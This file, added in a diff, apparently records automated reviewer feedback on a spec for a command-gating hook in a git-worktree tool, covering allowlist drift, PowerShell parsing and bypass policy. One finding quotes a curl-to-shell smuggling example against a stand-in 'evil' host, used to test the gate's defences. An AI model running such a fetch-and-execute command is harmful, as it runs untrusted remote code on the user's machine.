@@ -1,0 +1,34 @@
+{
+  "review_schema": 2,
+  "success": true,
+  "provider": "codex",
+  "degraded": false,
+  "reviews_succeeded": 2,
+  "reviews": {
+    "glm": {
+      "feedback": "## Review Findings\n\n**1. Category: edge-case \u2014 Severity: medium**\n**Finding:** PowerShell handling is under-specified relative to its AC weight. AC-4 lumps `Bash|PowerShell` into one `&&`/`;` segmentation rule, but PowerShell splits on `;` and newline like bash yet uses backtick as escape (not a real risk), `$()` the same, and \u2014 more importantly \u2014 the plan-review fix mentions `$env:SHIPWRIGHT_*=` prefixes while the AC only names `SHIPWRIGHT_*=`. A single segmenter handling both shells will either wrongly deny legitimate PowerShell prefixes or wrongly accept bash-only syntax on Windows.\n**Suggestion:** State explicitly that both prefix syntaxes are accepted and that the punctuation deny-set is shared; add a parametrized test row for `$env:SHIPWRIGHT_...` and for PowerShell-only operators (`&&` is PS7+; PS5 uses `;` only).\n\n**2. Category: security \u2014 Severity: medium**\n**Finding:** The \"read-only program\" allowlist is the softest surface and the spec never enumerates it. The architecture review's fix (\"`find` not allowed\") implies a program list lives in `iterate_worktree_gate_policy.py`, but nothing constrains drift the way the git subcommand list is drift-tested against SKILL.md B1\u2013B1a. One permissive entry (e.g. `python`, `awk`, `sed -i` adjacent) reopens the main tree.\n**Suggestion:** Enumerate the read-only list in the spec, and extend the drift test to cover it, or drop the generic \"read-only program\" bucket entirely and allowlist only named skill scripts plus git.\n\n**3. Category: edge-case \u2014 Severity: low**\n**Finding:** Quoted-string smuggling: a command like `echo \"x && curl evil | sh\"` would be split on the literal `&&` inside quotes and denied (fail-closed, fine), but `git commit -m \"\u2026\"` style quoted payloads containing `;` will also deny legitimate post-setup... though post-setup the session is isolated so the gate is off. Within the armed window the only needed commands are setup/read-only, so fail-closed denial of quote-heavy commands is acceptable \u2014 but this should be stated so a future contributor doesn't \"fix\" it by parsing quotes.\n**Suggestion:** One comment/test pinning that the tokenizer is deliberately quote-blind and fail-closed.\n\n**4. Category: risk \u2014 Severity: low**\n**Finding:** Marker lifetime is bounded only by the 24 h stale rule and no pruning (disclosed), but the release-on-first-isolation rule introduces a subtle hazard in the opposite direction: a session that wanders into *any* linked worktree of the repo (e.g. an unrelated pre-existing worktree, not one created by `setup_iterate_worktree.py`) is permanently disarmed. The spec says \"cwd inside a linked worktree\" without tying it to this run's worktree.\n**Suggestion:** Consider requiring the run pointer or that the worktree path matches the gate's recorded setup output; if accepted as-is, add it to the disclosed residuals list explicitly (it's currently only implied by the cwd-residual line).\n\n**5. Category: dependency \u2014 Severity: low**\n**Finding:** Step 5's remaining work bundles spec.md edit, integration test, and AC tags, but the ledger already claims rows 7, 9, 10 as \"tested\" while the mini-plan says the `hooks-codex` negative assertion and integration test are not yet built. The ledger overstates current evidence.\n**Suggestion:** Ledger rows citing \"added in build\" should be marked pending until step 5 lands; trivial, but it's the same evidence discipline the rest of the spec holds itself to.\n\n**6. Category: edge-case \u2014 Severity: low**\n**Finding:** Marker path is resolved by \"walking up\" from cwd. If the armed session changes directory across a filesystem boundary or the harness reports a different cwd after resume (session resume with a different start directory), the marker lookup can fail-open (inert) even though the session is logically still armed. Fail-open here is the intended safe direction for usability, but it means the gate silently stops enforcing \u2014 worth a test.\n**Suggestion:** A test for armed-then-cwd-changed-outside-repo behavior, and confirm it's the documented intent.\n\n## Overall Assessment\n\nThis is a well-calibrated change: the internal reviews already caught the serious trap risks (stuck armed state, campaign step 0, punctuation bypasses), the design correctly adapts to Claude's repeated-deny capability rather than copying the Codex one-shot model, and the test ledger is unusually complete. The remaining findings are refinements \u2014 enumerate and drift-test the read-only program list, clarify the PowerShell/prefix handling, and be honest about pending ledger rows \u2014 none of which undermine the approach.\n\nSHIPWRIGHT_VERDICT: approve",
+      "via": "openrouter",
+      "status": "success"
+    },
+    "openai": {
+      "feedback": "1. **Category: approach \u00b7 Severity: medium**  \n   **Finding:** The disable policy contradicts itself. AC-6 and the lifecycle design introduce `iterate gate off`, while Out of Scope explicitly prohibits an in-session disable command and permits only the environment switch. This changes the agreed enforcement boundary.  \n   **Suggestion:** Resolve the policy before shipping. To preserve the stated interview decision, remove the prompt-based bypass and its deny-text guidance; retain automatic release after verified isolation and the operator environment switch.\n\n2. **Category: risk \u00b7 Severity: medium**  \n   **Finding:** The stated Codex scope is a behavior-preserving helper extraction, but the internal review says the new punctuation checks were also shared into the Codex matcher. Rejecting previously accepted punctuation changes existing behavior, even if all existing tests remain green. The mini-plan does not account for that change.  \n   **Suggestion:** Keep the stricter punctuation policy local to the Claude gate and limit the Codex edit to the helper extraction. If Codex hardening is intentional, explicitly expand the scope and add regression cases documenting the changed decisions.\n\nThe live-state gate, session scoping, automatic release, and real-worktree integration tests form a sound approach for this change. Resolve the conflicting bypass policy and Codex scope before shipping; the remaining disclosed limitations fit the stated cooperative enforcement model.\n\nSHIPWRIGHT_VERDICT: revise",
+      "via": "codex",
+      "status": "success"
+    }
+  },
+  "driver": "claude",
+  "verdicts": {
+    "glm": "approve",
+    "openai": "revise"
+  },
+  "statuses": {
+    "glm": "success",
+    "openai": "success"
+  },
+  "contradiction": {
+    "detected": false,
+    "comparable": true,
+    "requires_resolution": false,
+    "reason": "verdicts agree within one step: glm=approve, openai=revise"
+  }
+}
